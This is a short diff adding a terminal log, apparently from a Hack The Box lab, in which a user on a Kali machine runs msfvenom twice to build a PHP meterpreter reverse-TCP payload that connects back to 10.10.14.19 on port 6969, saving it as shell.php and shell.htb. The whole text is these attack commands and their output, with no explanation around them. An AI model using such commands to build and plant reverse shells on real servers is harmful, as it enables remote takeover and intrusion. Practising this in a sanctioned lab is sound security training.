@@ -1,1 +1,15 @@
 
+hippoeug@kali:~$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.19 LPORT=6969 -f raw > shell.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 30687 bytes
+
+
+
+hippoeug@kali:~$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.19 LPORT=6969 -f raw > shell.htb
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 30687 bytes
+
